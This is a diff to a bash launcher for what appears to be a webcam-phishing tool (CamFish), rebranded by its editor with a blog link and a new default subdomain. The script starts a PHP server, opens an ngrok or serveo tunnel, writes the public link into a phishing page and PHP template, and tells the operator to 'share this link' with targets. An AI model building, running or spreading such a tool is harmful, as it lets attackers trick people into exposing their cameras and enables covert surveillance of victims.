@@ -2,7 +2,7 @@
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
 trap 'printf "\n";stop' 2
-
+clear
 banner() {
 printf "\e[1;32m· - - - - - - - - - - - - - - - - - - - - - - - - \n"
 printf "\e[1;32n|  \e[1;91m|_|_|     |_|_|  |_|    |_|  |_|_|     |_|_|  \e[1;32m|\n"
@@ -38,7 +38,9 @@ exit 1
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "You haven't followed all the steps.
+visit : https://myselfmukesh.blogspot.com
+Aborting..."; exit 1; }
  
 
 
@@ -81,7 +83,6 @@ done
 
 }
 
-
 server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
@@ -111,7 +112,6 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 }
 
-
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -127,8 +127,12 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "You haven't followed all the steps.
+visit : https://myselfmukesh.blogspot.com
+Aborting..."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "You haven't followed all the steps.
+visit : https://myselfmukesh.blogspot.com
+Aborting..."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -165,7 +169,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Share this link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
@@ -198,12 +202,11 @@ fi
 
 }
 
-
 payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' camfish.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' CamFish.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -212,7 +215,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="wishfish$RANDOM"
+default_subdomain="Mukesh$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
@@ -233,4 +236,3 @@ checkfound
 banner
 dependencies
 start1
-
